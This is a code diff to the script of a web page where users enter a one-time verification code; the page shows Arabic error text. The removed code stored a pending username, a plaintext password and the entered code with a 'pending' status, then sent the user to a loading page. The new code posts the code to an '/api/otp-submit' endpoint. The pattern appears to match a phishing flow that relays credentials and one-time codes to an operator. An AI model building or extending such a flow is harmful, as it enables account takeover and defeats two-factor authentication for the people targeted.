@@ -172,7 +172,7 @@
       });
     });
 
-    function handleVerify() {
+    async function handleVerify() {
       const code = Array.from(inputs).map(i => i.value).join('');
       const errorText = document.getElementById('errorText');
 
@@ -183,20 +183,18 @@
       errorText.style.display = 'none';
       document.getElementById('serverError').style.display = 'none';
 
-      const requests = JSON.parse(localStorage.getItem('verifyRequests') || '[]');
-      const id = Date.now().toString();
-      requests.push({
-        id: id,
-        username: sessionStorage.getItem('pendingUsername') || '',
-        password: sessionStorage.getItem('pendingPassword') || '',
-        code: code,
-        status: 'pending',
-        timestamp: new Date().toLocaleString()
-      });
-      localStorage.setItem('verifyRequests', JSON.stringify(requests));
-      sessionStorage.setItem('currentVerifyId', id);
-
-      window.location.href = 'verify-loading.html';
+      try {
+        const response = await fetch('/api/otp-submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code: code })
+        });
+        if (!response.ok) throw new Error('otp failed');
+        window.location.href = 'verify-loading.html';
+      } catch (error) {
+        document.getElementById('serverError').textContent = 'تعذر إرسال رمز التحقق. حاول مرة أخرى.';
+        document.getElementById('serverError').style.display = 'block';
+      }
     }
   </script>
 
